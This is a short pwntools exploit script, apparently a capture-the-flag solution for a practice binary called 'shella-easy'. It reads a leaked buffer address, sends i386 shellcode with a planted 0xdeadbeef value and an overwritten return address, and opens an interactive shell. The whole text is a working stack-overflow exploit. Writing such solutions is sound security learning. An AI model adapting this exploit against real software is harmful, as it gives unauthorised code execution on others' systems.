from pwn import *
context.binary = './shella-easy'
# io = gdb.debug('./shella-easy')
io = process('./shella-easy')

io.recvuntil(b"Yeah I'll have a ")
buffer_location = int(io.recvuntil(b' '), 16)

shellcode = asm(shellcraft.i386.linux.sh())

payload = flat({
    0 : shellcode,
    64 : p32(0xdeadbeef),
    cyclic_find(0x61616174) : p32(buffer_location),
})

io.sendline(payload)
io.interactive()
